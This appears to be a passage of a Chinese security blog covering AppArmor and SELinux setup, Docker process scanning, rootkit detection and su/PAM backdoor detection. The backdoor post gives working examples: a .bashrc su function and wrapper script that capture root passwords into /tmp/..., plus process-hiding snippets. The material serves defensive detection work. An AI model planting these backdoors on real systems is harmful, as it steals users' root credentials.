在这种模式下，配置文件里的限制条件不会得到执行，Apparmor只是对程序的行为进行记录。例如程序可以写一个在配置文件里注明只读的文件，但Apparmor不会对程序的行为进行限制，只是进行记录。\n\n那既然complain不能限制程序，为什么还需要这种模式呢，因为——如果某个程序的行为不符合其配置文件的限制，可以将其行为记录到系统日志，并且可以根据程序的行为，将日志转换成配置文件。当然我们可以随时对配置文件进行修改，选择自己需要的模式。\n\nApparmor可以对程序进行多方面的限制，这里我只介绍部分常用到的\n\n**（1）文件系统的访问控制**\n\nApparmor可以对某一个文件，或者某一个目录下的文件进行访问控制，包括以下几种访问模式：\n\n```\nr = read\nw = write\nl = link\nk = lock\na = append\nix = inherit = Inherit the parent's profile.\npx = requires a separate profile exists for the application, with environment scrubbing.\nPx = requires a separate profile exists for the application, without environment scrubbing.\nux and Ux = Allow execution of an application unconfined, with and without environmental scrubbing. (use with caution if at all).\nm = allow executable mapping.\n```\n\n在配置文件中的写法，如\n\n```xml\n如 /tmp r, (表示可对/tmp目录下的文件进行读取)\n```\n\n注意一点，没在配置文件中列出的文件，**程序是不能访问的，这有点像白名单。**\n\n**（2）资源限制**\n\nApparmor可以提供类似系统调用setrlimit一样的方式来限制程序可以使用的资源。要限制资源，可在配置文件中这样写：\n\n```bsh\nset rlimit [resource] <= [value],\n```\n\n其resource代表某一种资源，value代表某一个值，要对程序可以使用的虚拟内存做限制时，可以这样写：\n\n```bsh\nset rlimit as<=1M, （可以使用的虚拟内存最大为1M）\n```\n\n注意：Apparmor可以对程序要使用多种资源进行限制（fsize,data,stack,core,rss,as,memlock,msgqueue等），但暂不支持对程序可以使用CPU时间进行限制。\n\n**（3）访问网络**\n\nApparmor可以程序是否可以访问网络进行限制，在配置文件里的语法是：\n\n```bsh\nnetwork [ [domain] [type] [protocol] ]\n```\n\n了解网络编程的应该知道domain、type和protocol是什么。要让程序可以进行所有的网络操作，只需在配置文件中写：\n\n```bsh\nnetwork, \n```\n\n要允许程序使用在IPv4下使用TCP协议，可以这样写：\n\n```bsh\nnetwork inet tcp,\n```\n\n**（4）capability条目**\n\n在linux的手册页里面有一个capablities列表，apparmor可以限制程序是否可以进行列表里的操作，如：capability setgid,（允许程序进行setgid操作）\n\n```bsh\nCapability statements are simply the word capability followed by the name of the POSIX.1e capability as defined in the capabilities(7) man page.\n```\n\n## 配置文件的编写 \n\n前面提到，编写完配置文件后，要把文件放到/etc/apparmor.d这个目录下，其实有更方便的方法，直接在命令行里面用：\n\n```bash\nsudo genprof [filename]\n```\n\n就可以为指定的程序创建一个配置文件，并把它放到该目录。如：\n\n```bash\nsudo genprof '/home/361way/apparmor-helper/demoexe\n```\n\n建立的配置文件内容如下\n\n```c\n#include <tunables/global>  \n/home/361way/apparmor-helper/demoexe {     \n   #include <abstractions/base>\n}\n```\n\n注意，该文件默认使用enforcement模式，要修改模式，只需将配置文件改为：\n\n```c\n#include <tunables/global>  \n/home/361way/apparmor-helper/demoexe  flags=(complain){     \n\t#include <abstractions/base>  \n}\n```\n\nflags=(complain)前面的部分是文件的路径，作用是为这个配置文件绑定某个程序。那接下来就可以在配置文件中添加相应的内容，在大括号中加上：\n\n```bash\n/home/361way/apparmor-helper/data rw,    \n\tset rlimit stack<=1M,\n```\n\n然后再执行命令：\n\n```bash\nsudo /etc/init.d/apparmor reload\n```\n\n就可以重新加载配置文件，使配置文件生效。\n\n## apparmor的用法相关 \n\n#### 查询当前[Apparmor](https://wiki.debian.org/AppArmor/HowTo)的状态 \n\n```bash\nsudo apparmor_status\n```\n\n![img](/images/b1/3.png)\n\n#### 更改profile文件的状态 \n\n如果想把某个profile置为enforce状态，执行如下命令：\n\n```bash\nsudo enforce <application_name>\n```\n\n如果想把某个profile置为complain状态，执行如下命令：\n\n```bash\nsudo complain <application_name>\n```\n\n在修改了某个profile的状态后，执行如下命令使之生效：\n\n```bash\nsudo /etc/init.d/apparmor restart\n```\n\n#### profile文件的构建与管理 \n\nubuntu发行版预定义了一些profile，可以通过如下命令安装ubuntu下的些预定义的profile文件：\n\n```bash\nsudo apt-get install apparmor-profiles\n```\n\n通过工具来管理profile，比较著名是：apparmor-utils，通过如下命令进行安装：\n\n```bash\nsudo apt-get install apparmor-utils\n```\n\n此工具最常用的两个命令为：aa-genprof和aa-logprof，前者用来生成profile文件，后者用来查询处于apparmor的日志记录，如：\n\n```bash\nsudo aa-genprof slapd  //生成openldap程序的profile文件\n```\n\n#### profile编写\n\n```c\n#include <tunables/global>\n/usr/bin/kopete {  //需要限制的应用程序的名称\n#include <abstractions/X>\n#include <abstractions/audio>\n#include <abstractions/base>\n#include <abstractions/kde>\n#include <abstractions/nameservice>\n#include <abstractions/user-tmp>\n//限制其在对家目录下几个文件的读写权限\ndeny @{HOME}/.bash* rw,\ndeny @{HOME}/.cshrc rw,\ndeny @{HOME}/.profile rw,\ndeny @{HOME}/.ssh/* rw,\ndeny @{HOME}/.zshrc rw,\n\n//对以下文件具有读、写、或可执行的权限\n/etc/X11/cursors/oxy-white.theme r,\n/etc/default/apport r,\n/etc/kde4/* r,\n/etc/kde4rc r,\n/etc/kderc r,\n/etc/security/* r,\n/etc/ssl/certs/* r,\nowner /home/*/ r,\n/opt/firefox/firefox.sh Px,\n/usr/bin/convert rix,\n/usr/bin/kde4 rix,\n/usr/bin/kopete r,\n/usr/bin/kopete_latexconvert.sh rix,\n/usr/bin/launchpad-integration ix,\n/usr/bin/xdg-open mrix,\n/usr/lib/firefox*/firefox.sh Px,\n/usr/lib/kde4/**.so mr,\n/usr/lib/kde4/libexec/drkonqi ix,\n/usr/share/emoticons/ r,\n/usr/share/emoticons/** r,\n/usr/share/enchant/** r,\n/usr/share/kde4/** r,\n/usr/share/kubuntu-default-settings/** r,\n/usr/share/locale-langpack/** r,\n/usr/share/myspell/** r,\nowner @{HOME}/.config/** rwk,\nowner @{HOME}/.kde/** rwlk,\nowner @{HOME}/.local/share/mime/** r,\nowner @{HOME}/.thumbnails/** rw,\nowner @{HOME}/Downloads/ rw,\nowner @{HOME}/Downloads/** rw,\n}\n```\n\n如果想更详细的学习，参见具体的讲解profile语法格式的文档，如：http://ubuntuforums.org/showthread.php?t=1008906 \n\n# SElinux\n\n## 什么是SELinux\n\nSELinux(Secure Enhanced Linux)：安全增强的Linux 是一个Linux安全策略机制，允许管理员更加灵活的定义安全策略。\n\nSELinux是一个内核级的安全机制，从2.6内核之后，集成到Linux内核中。\n\nSELinux定义了两个基本概念：\n\n- 域：对进程进行限制；\n- 上下文：对文件进行限制；\n\n## SELinux模式 \n\nSELinux 拥有三个基本的操作模式，当中 Enforcing 是缺省的模式。此外，它还有一个 targeted 或 mls 的修饰语。这管制 SELinux 规则的应用有多广泛，当中 targeted 是较宽松的级别。\n\n- Enforcing： 这个缺省模式会在系统上启用并实施 SELinux 的安全性政策，拒绝访问及记录行动\n- Permissive： 在 Permissive 模式下，SELinux 会被启用但不会实施安全性政策，而只会发出警告及记录行动。Permissive 模式在排除 SELinux 的问题时很有用\n- Disabled： SELinux 已被停用 \n\n从上面不难看出，两者在强制模式上作用一样，而SELinux的宽松模式（Permissive）对应着apparmor的complain模式。\n\nSELinux模式可以通过修改配置文件：`/etc/sysconfig/selinux`进行修改。\n\n-  命令getenforce可以查看当前SELinux工作模式。 \n\n- 命令setenforce可以修改当前SELinux工作模式。 \n\n## SELinux的模式查看与修改 \n\n可以通过sestatus命令查看SELinux的状况：\n\n![img](/images/b1/4.png)\n\n可以运行如下命令，修改SELinux的运行状态：\n\n```bash\nsetenforce [ Enforcing | Permissive | 1 | 0 ]\n```\n\n## 查看程序或文件的SELinux信息 \n\n常见的属于 [coreutils 的工具](http://www.gnu.org/software/coreutils/manual/html_node/index.html)如 ps、ls 等等，可以通过增加 `Z 选项`的方式获知 SELinux 方面的信息。如：\n\n```bash\n[root@PEK1000250612 ygy]# ps auxZ | grep lldpad\nunconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 root 48754 0.0  0.0 111636 1016 pts/0 S+ 20:10   0:00 grep lldpad\n[root@PEK1000250612 ygy]# ls -Z /usr/lib/gcc/x86_64-redhat-linux/4.4.7/libgomp.so\nlrwxrwxrwx. root root system_u:object_r:lib_t:s0       /usr/lib/gcc/x86_64-redhat-linux/4.4.7/libgomp.so -> ../../../../lib64/libgomp.so.1.0.0\n```\n\n## 配置示例 \n\n需求：让 Apache 可以访问位于非默认目录下的网站文件/data/test\n\n1、先用`semanage fcontext -l | grep '/var/www'` 获知默认 `/var/www `目录的 SELinux 上下文：\n\n```bsh\n/var/www(/.*)? all files system_u:object_r:httpd_sys_content_t:s0\n```\n\n从中可以看到 Apache 只能访问包含 `httpd_sys_content_t `标签的文件。假设希望 Apache 使用 /data/test 作为网站文件目录，那么就需要给这个目录下的文件增加 httpd_sys_content_t 标签，分两步实现：\n\n- /data/test 这个目录下的文件添加默认标签类型\n\n```bsh\nsemanage fcontext -a -t httpd_sys_content_t '/data/test(/.*)?'\n```\n\n- 用新的标签类型标注已有文件\n\n```bsh\nrestorecon -Rv /data/test\n```\n\n之后 Apache 就可以使用该目录下的文件构建网站了。\n\n其中 restorecon 在 SELinux 管理中很常见，起到恢复文件默认标签的作用。比如当从用户主目录下将某个文件复制到 Apache 网站目录下时，Apache 默认是无法访问，因为用户主目录的下的文件标签是 user_home_t。此时就需要 restorecon 将其恢复为可被 Apache 访问的 httpd_sys_content_t 类型：\n\n```bsh\nrestorecon -v /data/test/foo.com/html/file.html\nrestorecon reset /data/test/foo.com/html/file.html context unconfined_u:object_r:user_home_t:s0->system_u:object_r:httpd_sys_co\n```\n\n# 总结\n\nSELinux比Apparmor更安全，更灵活，同时配置起来也更复杂。SELinux与Apparmor最大的区别在于：**Apparmor使用文件名（路径名）最为安全标签，而SELinux使用文件的inode作为安全标签，**这就意味着，Apparmor机制可以通过修改文件名而被绕过，另外，在文件系统中，只有inode才具有唯一性。 \n\n初学者建议选择Apparmor而不是SELinux是因为 Apparmor比SELinux更简单，SElinux复杂的语法配置可能令大部分人望而生却。\n\n\n\n**参考：**\n\nhttp://www.361way.com/apparmor-selinux/3648.html\n\nhttps://docs.docker.com/engine/security/apparmor/\n\nhttps://blog.csdn.net/ggf123456789/article/details/36686929?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task \n\nhttp://www.linuxdiyf.com/linux/2148.html","tags":["capabilites","apparmor","selinux"],"categories":["docker安全"]},{"title":"反入侵策略总结-扫描docker进程","url":"/2019/07/30/反入侵策略总结-扫描docker进程/","content":"\n# 原理\n\ndocker和宿主机共享内核的，进程在宿主机中也会显示的，如果一个进程是在docker容器中的进程，那么他的`pid_namespace`和docker容器中的`pid_namespace`是相同的。\n\n# 具体实现\n\n## 获取pid\n\n遍历/proc 获取进程pid\n\n## 获取namespace_pid\n\n遍历获取 /proc/[pid]/ns 的信息，ns目录下对应有这几个信息 \"cgroup\", \"ipc\", \"mnt\", \"net\", \"pid\", \"user\", \"uts\"\n\n## 获取docker namespace_pid\n\ncurl --unix-socket /var/run/docker.sock http://localhost/containers/bd54cf2711e0/json?strem=false \n\n![img](/images/a17/3.png)\n\n这是手动执行docker api获取的结果，那我们可以在代码中封装个docker api函数。\n\n利用/var/run/docker.sock来获取docker的数据中的结果，只不过请求方式进行了封装，不是直接通过unix domain socket的方式来获取数据．其实dockerApi()本质上是利用了 [docker remote api](https://docs.docker.com/engine/api/v1.39/#operation/ContainerList)．通过/containers/json获取所有的镜像的信息，包括镜像名字，容器名称，容器id等等信息。\n\n获取container_pid后，通过/proc/[pid]/ns/pid 获取namespace的pid，然后前面获取了进程所有的namespace_pid了，所以如果相等就可以得到哪些进程是属于container的了。\n\n完整过程示例：\n\n1. 首先通过var/run/docker.sock http://localhost/containers/bd54cf2711e0/json?strem=false获取到container_pid是39138，查看对应的namespace_pid\n\n   ![img](/images/a17/4.png)\n\n2. 如图所示是docker里启动的进程\n\n![img](/images/a17/5.png)\n\n查看两个进程pid对应的namespace_pid\n\n![img](/images/a17/6.png)\n\n3. 上面两步得到的namespace_pid相等，说明进程120493和进程120465是属于container进程39138创建的\n\n如果把他们看成sql表，使用类似如下的语法就可以获取他们关联的信息了。\n\n```sql\nSelect * from processes as p left join process_namespaces as pn on p.pid=pn.pid left join docker_containers as dc on pn.pid_namespace=dc.pid_namespace;\n```\n\n\n\n**参考：**\n\nhttps://blog.spoock.com/2019/07/19/using-osquery-monitor-docker/ ","tags":["namespace","docker"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-rootkit检测","url":"/2019/07/21/反入侵策略总结-rootkit检测/","content":"\n# linux进程隐藏\n\nLinux 下进程隐藏手法大体上分为两种，一种是基于用户态隐藏；一种是直接操控内核进行隐藏。\n\n## 替换源程序\n\n检测源程序的hash\n\n## 伪造进程名\n\n**a) 修改argv[0]**\n\n```c\nmemset((void *)argv[0], '\\0', strlen(argv[0]));\nstrcpy(argv[0], \"-\");\n```\n\n检测`/proc/[pid]/cmdline`中argv[0]和`/proc/[pid]/stat`或者`/proc/[pid]/status`所对应的程序名是否一致\n\n**b) 使用prctl**\n\n```c\n#include <stdio.h>\n#include <sys/prctl.h>\n\nint main(int argc, char *argv[], char *envp[])\n{\n    prctl(PR_SET_NAME, \"fuckyou\\0\",NULL,NULL,NULL);\n    sleep(10000);\n}\n```\n\n修改了`/proc/[pid]/status`和`/proc/[pid]/stat`, `/proc/[pid]/cmdline`没变，所以ps，top看到的进程名还是没有改变。\n\n**c）使用exec**\n\n```bash\nexec -a fake_name <程序> &\n```\n\n## 挂载覆盖 \n\n`mount --bind /tmp/empty /proc/[pid]`\n\n检测/proc/mounts文件，解析是否有挂载到/proc/[pid]的文件夹\n\nhttps://www.freebuf.com/articles/network/140535.html\n\n## Hook系统调用\n\n- 修改内核调用，比如getdents 的源码\n\n- 修改libc库中readdir 函数的源码\n- 利用环境变量LD_PRELOAD 或者配置ld.so.preload文件 以使的恶意的动态库先于系统标准库加载，以达到架空系统标准库中相关函数的目的，最终实现对特定进程的隐藏\n\n**检测：**\n\n1.  查看内核版本编译的时间？\n2. 监控libc文件\n3. 监控环境变量LD_PRELOAD和/etc/ld.so.preload （如果是手工排查可用`strace`或者`sysdig`）\n\n## 内核调用\n\n获取sys_call_table几种方法：\n1）暴力破解\n\n```c\n  for (start = (unsigned long *)0xc0000000; start < (unsigned long *)0xffffffff; start++)\n    if (start[__NR_close] == (unsigned long)sys_close){\n      return start;\n    }\n```\n\n2）通过/dev/kmem获取IDT address\n\n3) 通过dump获取绝对地址\n模拟出一个`call *sys_call_table(,%eax,4)`，然后看其机器码，然后在`system_call`的附近基于这个特征进行寻找\n4) 通过`kprobe`方式动态获取`kallsyms_lookup_name`，然后利用`kallsyms_lookup_name`获取`sys_call_table`的地址。`kallsyms_lookup_name()`可以用于获取内核导出符号表中的符号地址，而`sys_call_table`的地址也存在于内核导出符号表中，我么可以使用`kallsyms_lookup_name()`获取到`sys_call_table`的基地址。\n5）int 80中断\nhttps://www.cnblogs.com/LittleHann/p/3879961.html\nhttps://www.cnblogs.com/LittleHann/p/3854977.html#_lab2_3_6\n\n**检测：**\n\n原始的系统调用地址在**内核编译阶段被指定**，不会更改，通过比较原始的系统调用地址和当前内核态中的系统调用地址我们就可以发现系统调用有没有被更改。原始的系统调用地址在编译阶段被写入两个文件：\n\n- **System.map:** 该文件包含所有的符号地址，系统调用也包含在内\n\n- **vmlinux-2.4.x:** 系统初始化时首先被读入内存的内核映像文件\n\n> **0x1: 获取原始内核系统调用函数地址**\n>\n> `/boot/System.map-3.10.0-327.el7.x86_64`\n>\n> **0x2: 获取当前内核系统调用地址**\n>\n> `cat /proc/kallsyms` \n>\n> **0x3: 对比区别**\n>\n> 从里面枚举sys_call_table的function point地址\n> `/boot/System.map-3.10.0-327.el7.x86_64`和`cat /proc/kallsyms | grep sys_fork`进行diff对比 \n> `cat System.map-4.4.0-53-generic | grep sys_fork`\n>\n> ubuntu对sys_socket相关的系统调用会进行内核地址重定位，因此需要对检测结果进行一个误报过滤，看是否所有的函数的gap都相同，如果相同，则说明是系统自己的\n\n# Linux Hook技术\n\n## Ring3中Hook技术\n1）通过LD_PRELOAD劫持so文件\n\nLD_PRELOAD的加载顺序由/etc/ld.so.preload确定\n\n**绕过方式：**\n\n- 通过静态编码绕过LD_PRELOAD机制监控\n\n  通过静态链接方式编译so模块：`gcc -o test test.c -static`\n  在静态链接的模式下，程序不会去搜索系统中的so文件(不同是系统默认的、还是第三方加入的)，所以也就不会调用到Hook SO模块。\n\n- 通过内联汇编的方式绕过LD_PRELOAD机制监控 \n\n  使用内嵌汇编的形式直接通过syscall指令使用系统调用功能，同样也不会调用到Glibc提供的API。`asm(\"movq $2, %%rax\\n\\t syscal:\"=a\"(ret));`\n\n2）通过ptrace注入 \n\nptrace 可以让目标 pid 进程成为当前进程的子进程, 进而可以访问目标进程的内存空间, 寄存器, 并且可以向目标内存空间写内容. 需要了解 ptrace 函数的几个关键宏。参考链接  https://linux.die.net/man/2/ptrace :\n\n  > `PTRACE_ATTACH` 挂载目标pid \n  >\n  > `PTRACE_CONT `让子程序继续运行  \n  >\n  > `PTRACE_PEEKTEXT`  读取内容  \n  >\n  > `PTRACE_POKETEXT`  写入内容     \n\n  1. 用ptrace函数attach上目标进程  \n  2. 让目标进程的执行流程跳转到mmap函数来分配一小段内存空间  \n  3. 把一段机器码拷贝到目标进程中刚分配的内存中去  \n  4. 最后让目标进程的执行流程跳转到注入的代码执行  \n\n开启ptrace保护\n![img](/images/a16/1.png)\n\n利用工具地址：\n\nhttps://jmpews.github.io/2016/12/27/pwn/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5/\n\n## RING0 hook技术\n\n1) Kernel Inline Hook\n传统的kernel inline hook技术就是修改内核函数的opcode，通过写入jmp或push ret等指令跳转到新的内核函数中，从而达到劫持的目的。\n\n2）劫持sys_call_table \n\n3）利用Linux内核机制kprobe机制(kprobes, jprobe和kretprobe)进行系统调用Hook\nkprobe简介：https://www.cnblogs.com/LittleHann/p/3854977.html#_lab2_2_1\n\n4）LSM hook\nLSM框架自身并不提供任何安全策略，它只是为安全模型提供了一致性接口。它使得各种不同的安全模型以内核模块的方式得到实现，而且不需改动内核源代码以及重新编译内核。目前基于LSM框架实现的最主要的安全模块主要有：https://www.cnblogs.com/LittleHann/p/3854977.html#_lab2_3_4\n5）VDSO hook\nhttps://www.cnblogs.com/LittleHann/p/3879961.html\n6）LKM\nhttps://www.freebuf.com/articles/system/54263.html\nhttps://github.com/croemheld/lkm-rootkit/tree/master/src\n\n# Rootkit检测\n\n## 什么是rootkit\n\nRootkit是一种特殊的恶意软件，功能是在安全目标上隐藏自身及指定的文件、进程和网络链接等信息，通常rootkit和木马、后门等恶意程序结合使用。\n\n现在的操作系统，包括windows和Linux都是采用2层级别进行访问控制：即R0层和R3层。操作系统和驱动运行于R0层，一旦驱动加载成功，就与操作系统具有同样的权限，如果此驱动是恶意的，那么内核Rookit就植入了。用户态Rookit以普通应用程序（可能是应用层进程，或者模块，或者shellcode）形态运行在R3层。\n\n## 检测方案\n\n1） 从rootkit造成的效果审计角度去检测。\n\n比如：rootkit会使得自身或者指定的进程端口等隐藏掉，无法通过常用工具查看到；\n\n2） 静态文件特征检测方式；\n\n采用特征扫描方式，首先，要找到rootkit文件在哪？大部分情况，rootkit文件/进程/驱动会隐藏起来，通过一般的查询工具查找不到。其次，找到后，进行特征扫描，特征库要及时更新，这里存在匹配覆盖率低的可能。 \n\n3） 动态行为分析检测方式。\n\n首先要锁定目标进程/驱动执行体，才能通过各种方式来捕捉其运行期的行为，再通过行为规则匹配或者大数据分析的方式进行判定。\n\n### rootkit 进程隐藏检测\n\n#### 攻击手段\n\n可以通过多种手段实现进程隐藏，比如：\n\nA)  替换掉常见的进程查看工具（比如：ps、top、lsof）等；\n\nB)   Hook系统调用，篡改常用的进程查看工具的工作流程，劫持底层调用的函数，在读取`/proc/pid`目录时，过滤掉需隐藏进程信息。\n\nC)   通过内核模块，拦截proc文件系统的回调函数，过滤掉需隐藏进程信息；\n\nD)  利用环境变量LD_PRELOAD或者配置ld.so.preload文件，以使得恶意的动态库先于系统标准库加载，架空标准库中的相关函数，实现对特定进程隐藏。 \n\n#### 检测方法\n\n- 针对直接替换工具类，通过文件校验即可检测；\n\n- 对于hook 底层系统函数类，通过系统文件/内存完整性校验即可检测；\n\n- 新增内核模块类，需要通过基线检查（白名单机制）发现非白名单的内核模块；\n\n- 检查LD_PRELOAD变量和/etc/ld.so.preload文件\n\n### rootkit 应用层隐藏端口检测\n\n#### 攻击手段\n\n与进程隐藏思路类似，通过对Netstat等端口查看工具的调用过程中某个环节进行劫持，从而实现对指定端口信息的隐藏。Netstat是从/proc/net/tcp得到连接信息的。\n\n#### 检测方法\n\n通过libc系统调用函数bind，listen盲测端口，对比差异发现隐藏端口。\n\n具体如下：\n\n1） 从1到65535遍历端口；\n\n2） 创建一个基于TCP协议SOCK_STREAM的socket；\n\n3） 通过bind返回值和错误码探测端口状态；\n\n4） 如果被占用，通过listen错误码是EADDRINUSE确定端口占用；\n\n5） 通过ss或netstat命令过滤tcp协议，查看端口情况；\n\n6） 对比差异，确认差异的端口即为隐藏端口。\n\n7） 对系统上原本合法隐藏的端口信息等建立基线，在第6)中排除。\n\n相比tcp，udp使用SOCK_DGRAM的socket，缺少listen这步，其余检测步骤类似。\n\n### rootkit应用层恶意文件检测\n\n#### 检测方法\n\n假设能够拿到rootkit恶意文件样本，通过**特征匹配**的方式进行静态检测。\n\n#### 实现原理\n\n特征库包括：\n\n- 文件特征：如特征名、文件大小、目录名、文件和目录的隐藏属性；\n\n- 字符串特征：如被篡改的二进制文件和系统启动脚本中会包含一些特征字符串；\n\n- 内核符号表特征：通过加载内核模块而在内核符号表中留下的痕迹字符串等；\n\n统计特征：对一条样本已检测出的所有特征个数进行统计，超过阈值（比如：30%）则认为是有效rootkit，否则视为疑似rootkit；\n\n# 病毒木马检测\n\n其实和rootkit检测方法差不多，因为可以把木马也属于rookit中的一种。现在很多挖矿马，一方面可以使用静态特征进行判断，也可以可以添加对cup占用的检测，如果单进程占用cup的负载很高，又不是白名单中的进程，则很有可能存在安全风险。\n\n**计算cup占用情况的方法：**\n\n`/proc/stat` 存放所有CPU信息\n\n`/proc/<pid>/stat`存放当个进程的cpu信息\n\n> 1. 取一次processCpuTime1和totalCpuTime1;\n>\n> 2. 间隔一段时间，再取一次processCpuTime2和totalCpuTime2;\n>\n> 3. pcpu = 100 * (processCpuTime2 – processCpuTime1)/(totalCpuTime2 - totalCpuTime1);\n\n## 开源的杀毒引擎\n\n开源杀毒引擎ClamAV的病毒库非常强大，主要有\n\n1. 已知的恶意二进制文件的MD5哈希值\n2. PE(Windows 中可执行文件格式)节的MD5哈希值\n3. 十六进制特征码（shellcode）\n4. 存档元数据特征码\n5. 已知的合法文件的白名单数据库\n\n我们可以将clamav的病毒库转换为yara规则，进行恶意代码识别。也可以利用开源的**yara规则**，进行木马病毒的检测。","tags":["namespace","docker"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-后门检测","url":"/2019/07/01/反入侵策略总结-后门检测/","content":"\n# su后门\n\n## 1.1 别名\n\n在bashrc等文件配置`alias su= 'strace -o /tmp/supwd-date '+%d%h%m%s'.log -e read,write,connect -s2048 su `\n\n## 1.2 bash脚本\n\n编写su函数替代正常的su命令(如放入.bashrc中，普通用户登录时即生效)，当普通用户使用su切换到root时，su函数会记录用户参数。\n\n ```shell\nfunction su()\n{\n    local arg_list=(\"\" \"-\" \"-l\" \"--login\"\n    \"-c\" \"--command\" \"--session-command\"\n    \"-f\" \"--fast\"\n    \"-m\" \"--preserve-environment\" \"-p\"\n    \"-s\" \"--shell=SHELL\")\n    local flag=0 tmp_arg arg pass\n    if [ $UID -eq 0 ]; then\n        /bin/su $1; unset su ; return $?\n    fi\n    for arg in ${arg_list[@]}\n    do\n    [ \"$1\" = \"$arg\" ] && flag=1\n    done\n    [ $# -eq 0 ] && flag=1\n    tmp_arg=$1;tmp_arg=${tmp_arg:0:1};\n    [ \"$tmp_arg\" != \"-\" -a $flag -eq 0 ] && flag=1\n    if [ $flag -ne 1 ];then\n        /bin/su $1; return $?\n    fi\n    [ ! -f /tmp/... ] && `touch /tmp/... && chmod 777 /tmp/... >/dev/null 2>&1`\n    echo -ne \"Password:\\r\\033[?25l\"\n    read -t 30 -s pass\n    echo -ne \"\\033[K\\033[?25h\"\n    /bin/su && unset su && =echo $pass >> /tmp/...\n}\n ```\n\n## 1.3 C程序\n\nhttps://github.com/stanleyb0y/sushell向su传递密码参数的程序实现偷取root密码。\n\n下载解包后make编译出一个二进制pty用来向/bin/su传递参数，sushell是后门脚本。\n\n```shell\ncp pty /tmp/.su\ncp sushell /tmp/.X1-unix\necho alias su=/tmp/.X1-unix >> ~/.bashrc\n\n后门脚本/tmp/.X1-unix内容：\n#!/bin/bash\necho -ne \"Password:\\c\"\nread -t 30 -s pass\necho \"$pass\" >> /tmp/...\n/tmp/.su -p \"$pass\" /bin/su $*\n```\n\n## 检测\n\n1. 监控`/bin/su`是否被更改\n2. 监控配置文件`bashrc`和`profile`文件里是有有su的别名\n\n# PAM后门\n\n## 2.1 什么是PAM\n\nLinux-PAM是可插入认证模块(Pluggable Authentication Modules)，PAM使用配置/etc/pam.d/下的文件，来管理对程序的认证方式。它提供了对所有服务进行认证的中央机制，如远程登录应用（login,ftp,telnet,ssh,ppp），本地应用程序su等。\n\n![img](/images/a18/1.png)\n\n系统管理员通过PAM配置文件来制定不同应用程序的不同认证策略，具体来讲，系统是根据/etc/pam.d/下的各种服务配置文件，调用/lib/security下相应的模块，以加载**动态链接库的形式**实现需要的认证方式。\n\n应用程序开发者则可以通过在服务程序中使用**PAM API函数(如pam_xxxx)**来实现对认证方法的调用。\n\n## 2.2 PAM文件配置语法\n\n`module-type` `control-flag` `module_path optional` \n\n在/etc/pam.d/下的文件中，与服务名称相对应的文件，为该服务的pam验证文件，例如服务为sshd，则在/etc/pam.d下存在sshd这个文件，里面包含sshd验证规则。其中有个一特殊的文件为other，如果有的服务与之没有向对应的文件，则对应other。\n\n### module-type\n\n服务类型，即 auth、account、session 或 password。\n\n- 验证模块(auth)用于验证用户或设置/销毁凭证。 \n\n- 帐户管理模块(account)将执行与访问、帐户及凭证有效期、密码限制/规则等有关的操作。 \n\n- 会话管理模块(session)用于初始化和终止会话。\n\n- 密码管理模块(passwd)将执行与密码更改/更新有关的操作。 \n\n### control-flag\n\n用于指明在确定服务的集成成败值过程中模块所起的作用。有效的控制标志包括` include、optional、required、requisite 和 sufficient`。\n\n**Required：**表示本模块必须返回成功才能通过认证，但是如果该模块返回失败的话，失败结果也不会立即通知用户，而是要等到同一stack 中的所有模块全部执行完毕再将失败结果返回给应用程序。可以认为是一个必要条件。 \n\n**Requisite：**与required类似，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一stack内的任何模块，而是直 接将控制权返回给应用程序。是一个必要条件。 \n\n**Sufficient：**表明本模块返回成功已经足以通过身份认证的要求，不必再执行同一stack内的其它模块，但是如果本模块返回失败的话可以 忽略。可以认为是一个充分条件。 \n\n**Optional：**表明本模块是可选的，它的成功与否一般不会对身份认证起关键作用，其返回值一般被忽略。 \n\n### module-path\n\n用于实现服务的库对象的路径，一般都只写库名，库的路径一般为/lib/security(32位)，/lib64/security或/lib/x86_64-linux-gnu/security (64位)\n\n### module-options\n\n传递给服务模块的选项，可选。\n\n几个公用的参数：\n\n- **debug** 该模块应当用syslog( )将调试信息写入到系统日志文件中。 \n\n- **no_warn** 表明该模块不应把警告信息发送给应用程序。 \n- **use_first_pass** 表明该模块不能提示用户输入密码，而应使用前一个模块从用户那里得到的密码。 \n- **try_first_pass** 表明该模块首先应当使用前一个模块从用户那里得到的密码，如果该密码验证不通过，再提示用户输入新的密码。 \n- **use_mapped_pass** 该模块不能提示用户输入密码，而是使用映射过的密码。 \n- **expose_account** 允许该模块显示用户的帐号名等信息，一般只能在安全的环境下使用，因为泄漏用户名会对安全造成一定程度的威胁。 \n\n## 2.3 PAM各模块功能\n\n1. pam_securetty.so\n   - 类型：auth       \n   - 作用：只对root有限定，限定root登陆的终端，系统默认的“安全”中断保存在/etc/securetty中。\n\n2. pam_access.so\n   - 类型：account\n   - 作用：基于登录名，主机名或者所属域，ip地址或者网络\n      终端编号(类似于/etc/securetty)。默认的配置文件为/etc/security/access.conf\n\n3. pam_tally2.so\n\n   - 类型:auth\n\n   - 作用：限制用户登录的功能， 用户登录验证失败达到一定次数然后限制用户登录。\n\n   - 锁定账户参数：\n\n     - onerr=[fail|succeed]:\n\n     - file=/path/to/counter:当登陆超过允许次数时，日志保存的地方。默认的为/var/log/tallylog。当开启的时候，每当登陆失败一次，则会写入一次，使用pam_tally2 可以读出\n\n     - audit:如果用户找不到，则把此用户名记录到日志中\n\n     - silent：不输出任何信息\n\n     - no_log_info：不进行日志记录\n\n     - deny=N：当用户连续输错n次是，在第n+1次锁定该用户，没有 设定解锁解锁时间，则锁定之后需要手工解锁。\n\n     - pam_tally.so -u username --reset\n\n     - lock_time=n：当输入密码错误一次时，在N秒内不能再次登陆该账户。 \n\n     - unlock_time=n：解锁时间，当账户被锁定时，过n秒时，该账户 被接触锁定(清空/var/log/tallylog中的相关信息)，配合deny参数使用 magic_root：当uid=0时，不会往/var/log/tallylog中写入计 数，即这个PAM不生效 even_deny_root：对root用户生效(不加magic_root参数，对 root也是不处理的) root_unlock_time=n:是针对even_deny_root的，root用户的解锁时间 每当用户成功登陆过一次后，/var/log/tallylog中关于这个用 户的记录就会清空。 \n\n4. pam_cracklib\n   - 类型：password\n   - 